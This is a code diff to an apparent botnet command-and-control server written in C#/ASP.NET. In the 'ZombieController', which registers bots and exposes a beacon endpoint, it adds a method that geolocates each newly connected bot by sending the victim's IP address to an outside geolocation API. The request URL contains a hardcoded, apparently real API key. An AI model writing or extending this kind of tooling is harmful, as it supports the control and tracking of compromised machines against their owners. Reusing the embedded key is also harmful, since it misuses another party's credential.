@@ -2,6 +2,7 @@
 using C2.Models;
 using C2.POCOs;
 using Microsoft.AspNetCore.Mvc;
+using Newtonsoft.Json;
 
 namespace C2.Controllers;
 
@@ -9,6 +10,8 @@ namespace C2.Controllers;
 [Route("[controller]")]
 public class ZombieController : AbstractController
 {
+    static HttpClient client = new();
+
     [HttpGet("ZombieTest")]
     [ProducesResponseType(StatusCodes.Status200OK)]
     public IActionResult ZombieTest() => Ok();
@@ -46,6 +49,8 @@ public class ZombieController : AbstractController
             BotClientSpecs = specs
         };
 
+        _ = SetLocation(botClient);
+
         _ = C2State.BotManager.Bots.TryAdd(id, botClient);
 
         var initialResponse = new InitialResponse()
@@ -55,6 +60,33 @@ public class ZombieController : AbstractController
         };
 
         return Ok(initialResponse);
+    }
+
+    [NonAction]
+    public async Task SetLocation(BotClient bot)
+    {
+        string ip = bot.ConnectionInfo.Ip;
+
+        try
+        {
+            HttpResponseMessage response = await client.GetAsync($"https://api.ipgeolocation.io/ipgeo?apiKey=b46030b8450d4347805bd1c4488fde55&ip={ip}");
+
+            if (response.IsSuccessStatusCode)
+            {
+                string result = await response.Content.ReadAsStringAsync();
+                var location = JsonConvert.DeserializeObject<LocationInfo>(result);
+
+                bot.locationInfo = new(location);
+            }
+            else
+            {
+                Console.WriteLine($"Error: {response.StatusCode}");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Exception: {ex.Message}");
+        }
     }
 
     [HttpGet("Beacon")]
